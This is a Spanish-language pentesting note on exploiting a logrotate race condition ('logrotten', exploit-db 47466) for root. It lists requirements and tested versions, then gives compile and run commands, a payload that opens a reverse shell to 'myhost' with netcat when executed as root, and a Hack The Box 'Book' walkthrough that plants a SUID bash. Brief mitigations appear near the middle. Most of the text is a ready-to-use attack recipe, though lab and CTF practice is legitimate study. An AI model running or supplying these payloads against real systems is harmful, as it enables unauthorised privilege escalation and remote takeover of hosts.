** Privilege Escalation **
https://www.exploit-db.com/exploits/47466

Breve descripción
   - logrotate es propenso a una condición de carrera (race condition) después de cambiar el nombre del archivo de registro.
   - Si logrotate se ejecuta como root, con opción que crea un
     archivo (como crear, copiar, comprimir, etc.) y el usuario tiene el control
     de la ruta del archivo de registro, es posible abusar de una condición de carrera para escribir
     archivos en CUALQUIER directorio.
   - Un atacante podría elevar sus privilegios escribiendo shells inversos en
     directorios como "/etc/bash_completition.d/".

Requisito para la escalada de privilegios
   - Logrotate debe ejecutarse como root
   - La ruta de registro debe estar bajo el control del atacante.
   - Cualquier opción que crea archivos se establece en la configuración de logrotate

Versión probada
   - Debian GNU / Linux 9.5 (estirado)
   - AMI de Amazon Linux 2 (HVM)
   - Ubuntu 18.04.1
   - logrotate 3.8.6
   - logrotate 3.11.0
   - logrotate 3.15.0

Compilar
   - gcc -o logrotten logrotten.c

Preparar el payload
```
echo "if [`id -u` -eq 0]; then (/bin/nc -e /bin/bash myhost 3333 &);
fi" > payloadfile
```

Ejecutar exploit

Si la opción "create" está configurada en logrotate.cfg:
```
  ./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

Si la opción "compress" está configurada en logrotate.cfg:
```
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

Problemas conocidos
   - Es difícil ganar la carrera (race condition) dentro de un contenedor docker o en un volumen lvm2

Mitigación
   - asegúrese de que logpath sea propiedad de root
   - use la opción "su" en logrotate.cfg
   - use selinux o apparmor

** Ejemplo de uso en máquina Book_HTB **
1. Creamos fichero logrotten.c con el script en C (https://www.exploit-db.com/exploits/47466)
2. Compilamos el fichero --> `gcc logrotten.c -o logrotten`
3. Creamos fichero payloadfile --> 
``` bash
#!/bin/bash 
# Damos permiso SUID a la bash
chmod 4755 /bin/bash
```
4. La vulnerabilidad se da en el cambio de contenido de un fichero log, por lo que debemos tener un fichero log con contenido al cual logrotten podrá cambiar su contenido con el payloadfile.
5. Intoducir algo en el fichero /home/reader/backups/access.log
6. Ejecutar logrotten --> `./logrotten -p payloadfile /home/reader/backups/access.log`
7. Convertirse en root --> `bash -p`

